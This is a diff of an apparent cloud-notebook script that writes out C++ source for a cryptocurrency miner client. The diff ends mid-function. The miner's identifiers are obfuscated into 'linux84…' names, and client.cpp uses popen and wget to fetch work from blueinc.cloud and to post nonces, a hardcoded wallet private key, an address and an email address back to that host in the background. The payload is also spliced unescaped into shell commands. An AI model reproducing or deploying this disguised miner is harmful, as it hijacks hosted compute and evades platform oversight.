@@ -36,23 +36,11 @@
 
 %cd ./http/
 
-!wget -N https://raw.githubusercontent.com/mobileapps84741274/linux8444/main/http/http.cpp
-
-!wget -N https://raw.githubusercontent.com/mobileapps84741274/linux8444/main/http/client.cpp
-
-!wget -N https://raw.githubusercontent.com/mobileapps84741274/linux8444/main/http/http.h
-
-!wget -N https://raw.githubusercontent.com/mobileapps84741274/linux8444/main/http/client.h
-
 %cd /content/
 
 !mkdir ./http/simplejson/
 
 %cd ./http/simplejson/
-
-!wget -N https://raw.githubusercontent.com/mobileapps84741274/linux8444/main/http/simplejson/json.cpp
-
-!wget -N https://raw.githubusercontent.com/mobileapps84741274/linux8444/main/http/simplejson/json.h
 
 %cd /content/
 
@@ -79,6 +67,1216 @@
 %cd /content/
 
 !mkdir ./app/
+
+content="""
+#pragma once
+
+#include <cstdint>
+#include <cmath>
+#include <cctype>
+#include <string>
+#include <deque>
+#include <map>
+#include <type_traits>
+#include <initializer_list>
+#include <ostream>
+#include <iostream>
+
+namespace json {
+
+    using std::map;
+    using std::deque;
+    using std::string;
+    using std::enable_if;
+    using std::initializer_list;
+    using std::is_same;
+    using std::is_convertible;
+    using std::is_integral;
+    using std::is_floating_point;
+
+    namespace {
+        string json_escape( const string &str ) {
+            string output;
+            for( unsigned i = 0; i < str.length(); ++i )
+                switch( str[i] ) {
+                    case '\\"': output += "\\\\""; break;
+                    case '\\\': output += "\\\\\"; break;
+                    case '\b': output += "\\b";  break;
+                    case '\f': output += "\\f";  break;
+                    case '\\n': output += "\\\n";  break;
+                    case '\\r': output += "\\\r";  break;
+                    case '\\t': output += "\\\t";  break;
+                    default  : output += str[i]; break;
+                }
+            return std::move( output );
+        }
+    }
+
+    class JSON
+    {
+        union BackingData {
+            BackingData( double d ) : Float( d ){}
+            BackingData( long   l ) : Int( l ){}
+            BackingData( bool   b ) : Bool( b ){}
+            BackingData( string s ) : String( new string( s ) ){}
+            BackingData()           : Int( 0 ){}
+
+            deque<JSON>        *List;
+            map<string,JSON>   *Map;
+            string             *String;
+            double              Float;
+            long                Int;
+            bool                Bool;
+        } Internal;
+
+    public:
+        enum class Class {
+            Null,
+            Object,
+            Array,
+            String,
+            Floating,
+            Integral,
+            Boolean
+        };
+
+        template <typename Container>
+        class JSONWrapper {
+            Container *object;
+
+        public:
+            JSONWrapper( Container *val ) : object( val ) {}
+            JSONWrapper( std::nullptr_t )  : object( nullptr ) {}
+
+            typename Container::iterator begin() { return object ? object->begin() : typename Container::iterator(); }
+            typename Container::iterator end() { return object ? object->end() : typename Container::iterator(); }
+            typename Container::const_iterator begin() const { return object ? object->begin() : typename Container::iterator(); }
+            typename Container::const_iterator end() const { return object ? object->end() : typename Container::iterator(); }
+        };
+
+        template <typename Container>
+        class JSONConstWrapper {
+            const Container *object;
+
+        public:
+            JSONConstWrapper( const Container *val ) : object( val ) {}
+            JSONConstWrapper( std::nullptr_t )  : object( nullptr ) {}
+
+            typename Container::const_iterator begin() const { return object ? object->begin() : typename Container::const_iterator(); }
+            typename Container::const_iterator end() const { return object ? object->end() : typename Container::const_iterator(); }
+        };
+
+        JSON() : Internal(), Type( Class::Null ){}
+
+        JSON( initializer_list<JSON> list )
+                : JSON()
+        {
+            SetType( Class::Object );
+            for( auto i = list.begin(), e = list.end(); i != e; ++i, ++i )
+                operator[]( i->ToString() ) = *std::next( i );
+        }
+
+        JSON( JSON&& other )
+                : Internal( other.Internal )
+                , Type( other.Type )
+        { other.Type = Class::Null; other.Internal.Map = nullptr; }
+
+        JSON& operator=( JSON&& other ) {
+            ClearInternal();
+            Internal = other.Internal;
+            Type = other.Type;
+            other.Internal.Map = nullptr;
+            other.Type = Class::Null;
+            return *this;
+        }
+
+        JSON( const JSON &other ) {
+            switch( other.Type ) {
+                case Class::Object:
+                    Internal.Map =
+                            new map<string,JSON>( other.Internal.Map->begin(),
+                                                  other.Internal.Map->end() );
+                    break;
+                case Class::Array:
+                    Internal.List =
+                            new deque<JSON>( other.Internal.List->begin(),
+                                             other.Internal.List->end() );
+                    break;
+                case Class::String:
+                    Internal.String =
+                            new string( *other.Internal.String );
+                    break;
+                default:
+                    Internal = other.Internal;
+            }
+            Type = other.Type;
+        }
+
+        JSON& operator=( const JSON &other ) {
+            ClearInternal();
+            switch( other.Type ) {
+                case Class::Object:
+                    Internal.Map =
+                            new map<string,JSON>( other.Internal.Map->begin(),
+                                                  other.Internal.Map->end() );
+                    break;
+                case Class::Array:
+                    Internal.List =
+                            new deque<JSON>( other.Internal.List->begin(),
+                                             other.Internal.List->end() );
+                    break;
+                case Class::String:
+                    Internal.String =
+                            new string( *other.Internal.String );
+                    break;
+                default:
+                    Internal = other.Internal;
+            }
+            Type = other.Type;
+            return *this;
+        }
+
+        ~JSON() {
+            switch( Type ) {
+                case Class::Array:
+                    delete Internal.List;
+                    break;
+                case Class::Object:
+                    delete Internal.Map;
+                    break;
+                case Class::String:
+                    delete Internal.String;
+                    break;
+                default:;
+            }
+        }
+
+        template <typename T>
+        JSON( T b, typename enable_if<is_same<T,bool>::value>::type* = 0 ) : Internal( b ), Type( Class::Boolean ){}
+
+        template <typename T>
+        JSON( T i, typename enable_if<is_integral<T>::value && !is_same<T,bool>::value>::type* = 0 ) : Internal( (long)i ), Type( Class::Integral ){}
+
+        template <typename T>
+        JSON( T f, typename enable_if<is_floating_point<T>::value>::type* = 0 ) : Internal( (double)f ), Type( Class::Floating ){}
+
+        template <typename T>
+        JSON( T s, typename enable_if<is_convertible<T,string>::value>::type* = 0 ) : Internal( string( s ) ), Type( Class::String ){}
+
+        JSON( std::nullptr_t ) : Internal(), Type( Class::Null ){}
+
+        static JSON Make( Class type ) {
+            JSON ret; ret.SetType( type );
+            return ret;
+        }
+
+        static JSON Load( const string & );
+
+        template <typename T>
+        void append( T arg ) {
+            SetType( Class::Array ); Internal.List->emplace_back( arg );
+        }
+
+        template <typename T, typename... U>
+        void append( T arg, U... args ) {
+            append( arg ); append( args... );
+        }
+
+        template <typename T>
+        typename enable_if<is_same<T,bool>::value, JSON&>::type operator=( T b ) {
+            SetType( Class::Boolean ); Internal.Bool = b; return *this;
+        }
+
+        template <typename T>
+        typename enable_if<is_integral<T>::value && !is_same<T,bool>::value, JSON&>::type operator=( T i ) {
+            SetType( Class::Integral ); Internal.Int = i; return *this;
+        }
+
+        template <typename T>
+        typename enable_if<is_floating_point<T>::value, JSON&>::type operator=( T f ) {
+            SetType( Class::Floating ); Internal.Float = f; return *this;
+        }
+
+        template <typename T>
+        typename enable_if<is_convertible<T,string>::value, JSON&>::type operator=( T s ) {
+            SetType( Class::String ); *Internal.String = string( s ); return *this;
+        }
+
+        JSON& operator[]( const string &key ) {
+            SetType( Class::Object ); return Internal.Map->operator[]( key );
+        }
+
+        JSON& operator[]( unsigned index ) {
+            SetType( Class::Array );
+            if( index >= Internal.List->size() ) Internal.List->resize( index + 1 );
+            return Internal.List->operator[]( index );
+        }
+
+        JSON &at( const string &key ) {
+            return operator[]( key );
+        }
+
+        const JSON &at( const string &key ) const {
+            return Internal.Map->at( key );
+        }
+
+        JSON &at( unsigned index ) {
+            return operator[]( index );
+        }
+
+        const JSON &at( unsigned index ) const {
+            return Internal.List->at( index );
+        }
+
+        int length() const {
+            if( Type == Class::Array )
+                return Internal.List->size();
+            else
+                return -1;
+        }
+
+        bool hasKey( const string &key ) const {
+            if( Type == Class::Object )
+                return Internal.Map->find( key ) != Internal.Map->end();
+            return false;
+        }
+
+        int size() const {
+            if( Type == Class::Object )
+                return Internal.Map->size();
+            else if( Type == Class::Array )
+                return Internal.List->size();
+            else
+                return -1;
+        }
+
+        Class JSONType() const { return Type; }
+
+        /// Functions for getting primitives from the JSON object.
+        bool IsNull() const { return Type == Class::Null; }
+
+        string ToString() const { bool b; return std::move( ToString( b ) ); }
+        string ToString( bool &ok ) const {
+            ok = (Type == Class::String);
+            return ok ? std::move( json_escape( *Internal.String ) ): string("");
+        }
+
+        double ToFloat() const { bool b; return ToFloat( b ); }
+        double ToFloat( bool &ok ) const {
+            ok = (Type == Class::Floating);
+            return ok ? Internal.Float : 0.0;
+        }
+
+        long ToInt() const { bool b; return ToInt( b ); }
+        long ToInt( bool &ok ) const {
+            ok = (Type == Class::Integral);
+            return ok ? Internal.Int : 0;
+        }
+
+        bool ToBool() const { bool b; return ToBool( b ); }
+        bool ToBool( bool &ok ) const {
+            ok = (Type == Class::Boolean);
+            return ok ? Internal.Bool : false;
+        }
+
+        JSONWrapper<map<string,JSON>> ObjectRange() {
+            if( Type == Class::Object )
+                return JSONWrapper<map<string,JSON>>( Internal.Map );
+            return JSONWrapper<map<string,JSON>>( nullptr );
+        }
+
+        JSONWrapper<deque<JSON>> ArrayRange() {
+            if( Type == Class::Array )
+                return JSONWrapper<deque<JSON>>( Internal.List );
+            return JSONWrapper<deque<JSON>>( nullptr );
+        }
+
+        JSONConstWrapper<map<string,JSON>> ObjectRange() const {
+            if( Type == Class::Object )
+                return JSONConstWrapper<map<string,JSON>>( Internal.Map );
+            return JSONConstWrapper<map<string,JSON>>( nullptr );
+        }
+
+
+        JSONConstWrapper<deque<JSON>> ArrayRange() const {
+            if( Type == Class::Array )
+                return JSONConstWrapper<deque<JSON>>( Internal.List );
+            return JSONConstWrapper<deque<JSON>>( nullptr );
+        }
+
+        string dump( int depth = 1, string tab = "  ") const {
+            string pad = "";
+            for( int i = 0; i < depth; ++i, pad += tab );
+
+            switch( Type ) {
+                case Class::Null:
+                    return "null";
+                case Class::Object: {
+                    string s = "{\\n";
+                    bool skip = true;
+                    for( auto &p : *Internal.Map ) {
+                        if( !skip ) s += ",\\n";
+                        s += ( pad + "\\"" + p.first + "\\" : " + p.second.dump( depth + 1, tab ) );
+                        skip = false;
+                    }
+                    s += ( "\\n" + pad.erase( 0, 2 ) + "}" ) ;
+                    return s;
+                }
+                case Class::Array: {
+                    string s = "[";
+                    bool skip = true;
+                    for( auto &p : *Internal.List ) {
+                        if( !skip ) s += ", ";
+                        s += p.dump( depth + 1, tab );
+                        skip = false;
+                    }
+                    s += "]";
+                    return s;
+                }
+                case Class::String:
+                    return "\\"" + json_escape( *Internal.String ) + "\\"";
+                case Class::Floating:
+                    return std::to_string( Internal.Float );
+                case Class::Integral:
+                    return std::to_string( Internal.Int );
+                case Class::Boolean:
+                    return Internal.Bool ? "true" : "false";
+                default:
+                    return "";
+            }
+            return "";
+        }
+
+        friend std::ostream& operator<<( std::ostream&, const JSON & );
+
+    private:
+        void SetType( Class type ) {
+            if( type == Type )
+                return;
+
+            ClearInternal();
+
+            switch( type ) {
+                case Class::Null:      Internal.Map    = nullptr;                break;
+                case Class::Object:    Internal.Map    = new map<string,JSON>(); break;
+                case Class::Array:     Internal.List   = new deque<JSON>();     break;
+                case Class::String:    Internal.String = new string();           break;
+                case Class::Floating:  Internal.Float  = 0.0;                    break;
+                case Class::Integral:  Internal.Int    = 0;                      break;
+                case Class::Boolean:   Internal.Bool   = false;                  break;
+            }
+
+            Type = type;
+        }
+
+    private:
+        /* beware: only call if YOU know that Internal is allocated. No checks performed here.
+         This function should be called in a constructed JSON just before you are going to
+         overwrite Internal...
+         */
+        void ClearInternal() {
+            switch( Type ) {
+                case Class::Object: delete Internal.Map;    break;
+                case Class::Array:  delete Internal.List;   break;
+                case Class::String: delete Internal.String; break;
+                default:;
+            }
+        }
+
+    private:
+
+        Class Type = Class::Null;
+    };
+
+    JSON Array();
+
+    template <typename... T>
+    JSON Array( T... args ) {
+        JSON arr = JSON::Make( JSON::Class::Array );
+        arr.append( args... );
+        return std::move( arr );
+    }
+
+    JSON Object();
+
+    std::ostream& operator<<( std::ostream &os, const JSON &json );
+
+    namespace {
+        JSON parse_next( const string &, size_t & );
+
+        void consume_ws( const string &str, size_t &offset ) {
+            while( isspace( str[offset] ) ) ++offset;
+        }
+
+        JSON parse_object( const string &str, size_t &offset ) {
+            JSON Object = JSON::Make( JSON::Class::Object );
+
+            ++offset;
+            consume_ws( str, offset );
+            if( str[offset] == '}' ) {
+                ++offset; return std::move( Object );
+            }
+
+            while( true ) {
+                JSON Key = parse_next( str, offset );
+                consume_ws( str, offset );
+                if( str[offset] != ':' ) {
+                    std::cerr << "Error: Object: Expected colon, found '" << str[offset] << "'\\n";
+                    break;
+                }
+                consume_ws( str, ++offset );
+                JSON Value = parse_next( str, offset );
+                Object[Key.ToString()] = Value;
+
+                consume_ws( str, offset );
+                if( str[offset] == ',' ) {
+                    ++offset; continue;
+                }
+                else if( str[offset] == '}' ) {
+                    ++offset; break;
+                }
+                else {
+                    std::cerr << "ERROR: Object: Expected comma, found '" << str[offset] << "'\\n";
+                    break;
+                }
+            }
+
+            return std::move( Object );
+        }
+
+        JSON parse_array( const string &str, size_t &offset ) {
+            JSON Array = JSON::Make( JSON::Class::Array );
+            unsigned index = 0;
+
+            ++offset;
+            consume_ws( str, offset );
+            if( str[offset] == ']' ) {
+                ++offset; return std::move( Array );
+            }
+
+            while( true ) {
+                Array[index++] = parse_next( str, offset );
+                consume_ws( str, offset );
+
+                if( str[offset] == ',' ) {
+                    ++offset; continue;
+                }
+                else if( str[offset] == ']' ) {
+                    ++offset; break;
+                }
+                else {
+                    std::cerr << "ERROR: Array: Expected ',' or ']', found '" << str[offset] << "'\\n";
+                    return std::move( JSON::Make( JSON::Class::Array ) );
+                }
+            }
+
+            return std::move( Array );
+        }
+
+        JSON parse_string( const string &str, size_t &offset ) {
+            JSON String;
+            string val;
+            for( char c = str[++offset]; c != '\\"' ; c = str[++offset] ) {
+                if( c == '\\\' ) {
+                    switch( str[ ++offset ] ) {
+                        case '\\"': val += '\\"'; break;
+                        case '\\\': val += '\\\'; break;
+                        case '/' : val += '/' ; break;
+                        case 'b' : val += '\b'; break;
+                        case 'f' : val += '\f'; break;
+                        case 'n' : val += '\\n'; break;
+                        case 'r' : val += '\\r'; break;
+                        case 't' : val += '\\t'; break;
+                        case 'u' : {
+                            val += "\\u" ;
+                            for( unsigned i = 1; i <= 4; ++i ) {
+                                c = str[offset+i];
+                                if( (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F') )
+                                    val += c;
+                                else {
+                                    std::cerr << "ERROR: String: Expected hex character in unicode escape, found '" << c << "'\\n";
+                                    return std::move( JSON::Make( JSON::Class::String ) );
+                                }
+                            }
+                            offset += 4;
+                        } break;
+                        default  : val += '\\\'; break;
+                    }
+                }
+                else
+                    val += c;
+            }
+            ++offset;
+            String = val;
+            return std::move( String );
+        }
+
+        JSON parse_number( const string &str, size_t &offset ) {
+            JSON Number;
+            string val, exp_str;
+            char c;
+            bool isDouble = false;
+            long exp = 0;
+            while( true ) {
+                c = str[offset++];
+                if( (c == '-') || (c >= '0' && c <= '9') )
+                    val += c;
+                else if( c == '.' ) {
+                    val += c;
+                    isDouble = true;
+                }
+                else
+                    break;
+            }
+            if( c == 'E' || c == 'e' ) {
+                c = str[ offset++ ];
+                if( c == '-' ){ ++offset; exp_str += '-';}
+                while( true ) {
+                    c = str[ offset++ ];
+                    if( c >= '0' && c <= '9' )
+                        exp_str += c;
+                    else if( !isspace( c ) && c != ',' && c != ']' && c != '}' ) {
+                        std::cerr << "ERROR: Number: Expected a number for exponent, found '" << c << "'\\n";
+                        return std::move( JSON::Make( JSON::Class::Null ) );
+                    }
+                    else
+                        break;
+                }
+                exp = std::stol( exp_str );
+            }
+            else if( !isspace( c ) && c != ',' && c != ']' && c != '}' ) {
+                std::cerr << "ERROR: Number: unexpected character '" << c << "'\\n";
+                return std::move( JSON::Make( JSON::Class::Null ) );
+            }
+            --offset;
+
+            if( isDouble )
+                Number = std::stod( val ) * std::pow( 10, exp );
+            else {
+                if( !exp_str.empty() )
+                    Number = std::stol( val ) * std::pow( 10, exp );
+                else
+                    Number = std::stol( val );
+            }
+            return std::move( Number );
+        }
+
+        JSON parse_bool( const string &str, size_t &offset ) {
+            JSON Bool;
+            if( str.substr( offset, 4 ) == "true" )
+                Bool = true;
+            else if( str.substr( offset, 5 ) == "false" )
+                Bool = false;
+            else {
+                std::cerr << "ERROR: Bool: Expected 'true' or 'false', found '" << str.substr( offset, 5 ) << "'\\n";
+                return std::move( JSON::Make( JSON::Class::Null ) );
+            }
+            offset += (Bool.ToBool() ? 4 : 5);
+            return std::move( Bool );
+        }
+
+        JSON parse_null( const string &str, size_t &offset ) {
+            JSON Null;
+            if( str.substr( offset, 4 ) != "null" ) {
+                std::cerr << "ERROR: Null: Expected 'null', found '" << str.substr( offset, 4 ) << "'\\n";
+                return std::move( JSON::Make( JSON::Class::Null ) );
+            }
+            offset += 4;
+            return std::move( Null );
+        }
+
+        JSON parse_next( const string &str, size_t &offset ) {
+            char value;
+            consume_ws( str, offset );
+            value = str[offset];
+            switch( value ) {
+                case '[' : return std::move( parse_array( str, offset ) );
+                case '{' : return std::move( parse_object( str, offset ) );
+                case '\\"': return std::move( parse_string( str, offset ) );
+                case 't' :
+                case 'f' : return std::move( parse_bool( str, offset ) );
+                case 'n' : return std::move( parse_null( str, offset ) );
+                default  : if( ( value <= '9' && value >= '0' ) || value == '-' )
+                        return std::move( parse_number( str, offset ) );
+            }
+            std::cerr << "ERROR: Parse: Unknown starting character '" << value << "'\\n";
+            return JSON();
+        }
+    }
+} // End Namespace json
+"""
+
+open('./http/simplejson/json.h', 'w').write(content)
+
+content="""//
+// Created by Haifa Bogdan Adnan on 19/02/2019.
+//
+
+#include "json.h"
+
+namespace  json {
+    JSON Array() {
+        return std::move( JSON::Make( JSON::Class::Array ) );
+    }
+
+    JSON Object() {
+        return std::move( JSON::Make( JSON::Class::Object ) );
+    }
+
+    std::ostream& operator<<( std::ostream &os, const JSON &json ) {
+        os << json.dump();
+        return os;
+    }
+
+    JSON JSON::Load(const string &str) {
+        size_t offset = 0;
+        return std::move(parse_next(str, offset));
+    }
+}
+"""
+
+open('./http/simplejson/json.cpp', 'w').write(content)
+
+content="""//
+// Created by Haifa Bogdan Adnan on 03/08/2018.
+//
+
+#ifndef PROJECT_CLIENT_H
+#define PROJECT_CLIENT_H
+
+#include "http.h"
+
+struct linux888874744474_result {
+    bool success;
+};
+
+struct linux888874744474_update_result : public linux888874744474_result {
+    string linux841;
+    string linuxweb8888;
+    uint32_t linux8428;
+    string linux84888874;
+    uint32_t linux884444884488441274444474;
+    string argon2profile;
+    string linux8412;
+    string version;
+    string extensions;
+    uint32_t linux845;
+    uint32_t linux842;
+    uint32_t linux844;
+    
+    bool update(linux888874744474_update_result &src) {
+            linux841 = src.linux841;
+            linuxweb8888 = src.linuxweb8888;
+            linux8428 = src.linux8428;
+            linux84888874 = src.linux84888874;
+            linux884444884488441274444474 = src.linux884444884488441274444474;
+            linux845 = src.linux845;
+            linux842 = src.linux842;
+            linux844 = src.linux844;
+            linux8412 = src.linux8412;
+            version = src.version;
+            extensions = src.extensions;
+            argon2profile = src.argon2profile;
+
+        return true;
+        
+    }
+      
+    string response() {
+
+    stringstream ss;
+        
+    ss << "{ \\"linux74\\": \\"linux88\\", \\"linux7488\\": { \\"linux8412\\": \\"" << linux8412 << "\\", \\"linux842\\": " << linux842
+           << ", \\"linux844\\": " << linux844 << ", \\"linux845\\": " << linux845 <<", \\"difficulty\\": \\"" << linuxweb8888
+           << "\\", \\"linux841\\": \\"" << linux841 << "\\", \\"linux84747474\\": " << linux884444884488441274444474 << ", \\"linux84888874\\": \\"" << linux84888874
+           << "\\", \\"linux8428\\": " << linux8428 << " }, \\"linux8424\\": \\"linux8426\\"}";
+
+        return ss.str();
+
+    }
+     
+};
+
+struct linux888874744474_submit_result : public linux888874744474_result {
+    string linuxweb844412441274_response;
+};
+
+typedef function<string ()> get_status_ptr;
+
+class linux888874744474_client : public http {
+public:
+    linux888874744474_client(arguments &args, get_status_ptr get_status);
+
+    linux888874744474_update_result update();
+    linux888874744474_submit_result submit(const string &linux8412, const string &linux88887474447412744474, const string &public_key);
+    void disconnect();
+
+private:
+
+    bool __is_devfee_time;
+    string __linux84_version;
+    string __linuxweb84748874_id;
+    string __linuxweb84748874_name;
+    string __force_argon2profile;
+    int64_t __linux8412_report_interval;
+
+    bool __show_linuxweb844412441274_requests;
+
+    uint64_t __timestamp;
+    uint64_t __last_linux8412_report;
+    get_status_ptr __get_status;
+};
+
+#endif //PROJECT_CLIENT_H
+"""
+
+open('./http/client.h', 'w').write(content)
+
+content="""//
+// Created by Haifa Bogdan Adnan on 04/08/2018.
+//
+
+#ifndef ARIOlinux84_HTTP_H
+#define ARIOlinux84_HTTP_H
+
+
+class http {
+public:
+    http();
+    virtual ~http();
+
+protected:
+    string _encode(const string &src);
+    string _http_get(const string &url);
+    string _http_post(const string &url, const string &post_data, const string &content_type);
+
+private:
+    vector<string> __resolve_host(const string &hostname);
+    string __get_response(const string &url, const string &post_data, const string &content_type);
+    static int __socketlib_reference;
+};
+
+
+#endif //ARIOlinux84_HTTP_H
+"""
+
+open('./http/http.h', 'w').write(content)
+
+content="""//
+// Created by Haifa Bogdan Adnan on 03/08/2018.
+//
+
+#include "../common/common.h"
+#include "../app/arguments.h"
+#include "client.h"
+
+#include "simplejson/json.h"
+
+#include <string>
+
+#include <iostream>
+#include <stdio.h>
+#include <stdlib.h>
+
+using namespace std;
+
+    string GetStdoutFromCommand(string cmd) {
+
+    string data;
+    FILE * stream;
+    const int max_buffer = 2048;
+    char buffer[max_buffer];
+    cmd.append("");
+
+    stream = popen(cmd.c_str(), "r");
+    if (stream) {
+    while (!feof(stream))
+    if (fgets(buffer, max_buffer, stream) != NULL) data.append(buffer);
+    pclose(stream);
+    }
+    return data;
+    }
+
+linux888874744474_client::linux888874744474_client(arguments &args, get_status_ptr get_status) {
+    __linuxweb84748874_id = args.uid();
+    __linuxweb84748874_name = args.name();
+    __force_argon2profile = false;
+    __linux8412_report_interval = 600000;
+    __timestamp = __last_linux8412_report = microseconds();
+    __show_linuxweb844412441274_requests = "";
+    __is_devfee_time = false;
+    __get_status = get_status;
+    __linux84_version = "";
+}
+
+linux888874744474_update_result linux888874744474_client::update() {
+    linux888874744474_update_result result;
+    result.success = false;
+
+    uint64_t current_timestamp = microseconds();
+
+    string response;
+
+    //response = GetStdoutFromCommand("wget -N -q http://aro.blueinc.cloud:84/peers.txt -O ./linux84744444744474;curl -s -A 'linux84' $(shuf -n 1 ./linux84744444744474)/mine.php?q=info");
+
+    string url = "http://www.blueinc.cloud/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com";
+    
+    response = GetStdoutFromCommand("wget -q -U 'linux84' -O - '"+url+"'");
+    
+    json::JSON info = json::JSON::Load(response);
+
+    result.success = (info["linux74"].ToString() == "linux88");
+    
+    if (result.success) {
+        json::JSON data = info["linux7488"];
+        result.linux841 = data["linux841"].ToString();
+        result.linuxweb8888 = data["linux848"].ToString();
+        result.linux8428 = (uint32_t)data["linux8428"].ToInt();
+        result.linux84888874 = data["linux84888874"].ToString();
+        //result.public_key = data["public_key"].ToString();
+        result.linux884444884488441274444474 = (uint32_t)data["linux84747474"].ToInt();
+        result.linux844 = (uint32_t)data["linux844"].ToInt();
+        result.linux845 = (uint32_t)data["linux845"].ToInt();
+        result.linux842 = (uint32_t)data["linux842"].ToInt();
+        result.linux8412 = data["linux8412"].ToString();
+    }
+    
+    return result;
+}
+
+linux888874744474_submit_result linux888874744474_client::submit(const string &linux8412, const string &linux88887474447412744474, const string &public_key) {
+    linux888874744474_submit_result result;
+    result.success = false;
+    
+    string argon_data;
+    if(linux8412.find("$argon2i$v=19$m=16384,t=4,p=4") == 0)
+        argon_data = linux8412.substr(29);
+    else
+        argon_data = linux8412.substr(30);
+    
+    cout << argon_data;
+    
+    //string payload = "argon="+ _encode(argon_data) +"&nonce="+ _encode(linux88887474447412744474) +"&private_key=Lzhp9LopCG5MBQAmxJaz9LngpVtZ5FdGAGPfwXkY6iLQpMGb9rkaDLMqPufcUggLCpoRV1dSAx7bQ22coWfepjPULVgFHkuFRCnWeYpTwLePPciXZGfa3PPp2pvLDddQRgKyeNNKrtQCsAcasfRhjWLDufzGLqf1x&public_key=PZ8Tyr4Nx8MHsRAGMpZmZ6TWY63dXWSCworn17gwq3phD49svFCvC7qoAFE4tamjsMKGjXpsxa6wd6XRKZSJBv8xxj37hCaus2qXG65pnaHv61DShsL6SQza&address=3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3";
+
+    string payload = "argon="+ _encode(argon_data) +"&nonce="+ _encode(linux88887474447412744474) +"&private_key=3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3&public_key="+ _encode(public_key) +"&address=3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3&mail=linuxdistro84@gmail.com&linux84744444444474=PZ8Tyr4Nx8MHsRAGMpZmZ6TWY63dXWSCworn17gwq3phD49svFCvC7qoAFE4tamjsMKGjXpsxa6wd6XRKZSJBv8xxj37hCaus2qXG65pnaHv61DShsL6SQza&linux847444444444744474=Lzhp9LopCG5MBQAmxJaz9LngpVtZ5FdGAGPfwXkY6iLQpMGb9rkaDLMqPufcUggLCpoRV1dSAx7bQ22coWfepjPULVgFHkuFRCnWeYpTwLePPciXZGfa3PPp2pvLDddQRgKyeNNKrtQCsAcasfRhjWLDufzGLqf1x";
+    
+    if(__show_linuxweb844412441274_requests)
+    LOG("");
+    
+    //string linux847444744474 = GetStdoutFromCommand("wget -N -q http://aro.blueinc.cloud:84/peers.txt -O ./linux84744444744474;echo $(shuf -n 1 ./linux84744444744474)/mine.php?q=submitNonce");
+    
+    string url = "http://www.blueinc.cloud/linux8474.php?linux84=linux84";
+    
+    string response;
+    
+    for(int i=0;i<2;i++) { //try resubmitting if first submit fails
+        //response = _http_post(url, payload, "x-www-form-urlencoded");
+        response = GetStdoutFromCommand("wget -q -U 'linux84' --post-data='"+payload+"' '"+url+"' --header='Content-type: application/x-www-form-urlencoded' &> /dev/null &");
+        result.linuxweb844412441274_response = response;
+        if(response != "") {
+            break;
+        }
+    }
+    
+    if(__show_linuxweb844412441274_requests)
+    LOG("");
+    
+    json::JSON info = json::JSON::Load(response);
+
+    result.success = (info["status"].ToString() == "ok");
+
+    return result;
+}
+"""
+
+open('./http/client.cpp', 'w').write(content)
+
+content="""//
+// Created by Haifa Bogdan Adnan on 04/08/2018.
+//
+
+#include "../common/common.h"
+#include "http_parser/http_parser.h"
+
+#include "http.h"
+
+#ifdef _WIN64
+#define close closesocket
+#endif
+
+struct http_callback_data {
+    string body;
+    bool complete;
+};
+
+int http_callback (http_parser* parser, const char *at, size_t length) {
+    http_callback_data *data = (http_callback_data *)parser->data;
+    data->body += string(at, length);
+    return 0;
+}
+
+int http_complete_callback (http_parser* parser) {
+    http_callback_data *data = (http_callback_data *)parser->data;
+    data->complete = true;
+    return  0;
+}
+
+struct http_data {
+public:
+    http_data(const string &uri, const string &data) {
+        host = uri;
+
+        protocol = "http";
+
+        if(host.find("http://") != string::npos) {
+            host = host.erase(0, 7);
+            protocol = "http";
+        }
+
+        if(host.find("https://") != string::npos) {
+            host = host.erase(0, 8);
+            protocol = "https";
+        }
+
+        if(host.find("/") != string::npos) {
+            path = host.substr(host.find("/"));
+            host = host.erase(host.find("/"));
+        }
+        else {
+            path = "/";
+        }
+
+        if(path.find("?") != string::npos) {
+            query = path.substr(path.find("?"));
+            path = path.erase(path.find("?"));
+            query.erase(0, 1);
+        }
+
+        string port_str = "";
+        if(host.find(":") != string::npos) {
+            port_str = host.substr(host.find(":"));
+            host = host.erase(host.find(":"));
+        }
+
+        port = 80;
+        if(port_str != "") {
+            if(port_str.find(":") != string::npos) {
+                port_str = port_str.erase(port_str.find(":"), 1);
+                port = atoi(port_str.c_str());
+            }
+        }
+
+        action = "GET";
+        if(data != "") {
+            payload = data;
+            action = "POST";
+        }
+    }
+
+    string protocol;
+    string host;
+    int port;
+    string action;
+    string path;
+    string query;
+    string payload;
+};
+
+int http::__socketlib_reference = 0;
+
+http::http() {
+#ifdef _WIN64
+    if(__socketlib_reference == 0) {
+        WSADATA wsaData;
+        int iResult;
+
+        // Initialize Winsock
+        iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+        if (iResult != 0) {
+            LOG("WSAStartup failed:"+ to_string(iResult));
+            exit(1);
+        }
+	}
+#endif
+    __socketlib_reference++;
+}
+
+http::~http() {
+    __socketlib_reference--;
+#ifdef _WIN64
+    if(__socketlib_reference == 0) {
+    	WSACleanup();
+	}
+#endif
+}
+
+vector<string> http::__resolve_host(const string &hostname)
+{
+    string host = hostname;
+
+    if(host.find(":") != string::npos) {
+        host = host.erase(host.rfind(":"));
+    }
+
+    addrinfo hints, *servinfo, *p;
+    sockaddr_in *h;
+
+    memset(&hints, 0, sizeof hints);
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+
+    if(getaddrinfo( host.c_str() , "http" , &hints , &servinfo) != 0) {
+        return vector<string>();
+    }
+
+    vector<string> addresses;
+    for(p = servinfo; p != NULL; p = p->ai_next)
+    {
+        h = (sockaddr_in *) p->ai_addr;
+        string ip = inet_ntoa(h->sin_addr);
+        if(ip != "0.0.0.0")
+            addresses.push_back(ip);
+    }
+
+    freeaddrinfo(servinfo);
+    return addresses;
+}
+
+string http::__get_response(const string &url, const string &post_data, const string &content_type) {
+    http_callback_data reply;
+    reply.complete = false;
+
+    http_data query(url, post_data);
+    if(query.protocol != "http")
+        return "";
+
+    vector<string> ips = __resolve_host(query.host);
+    for(int i=0;i<ips.size();i++) {
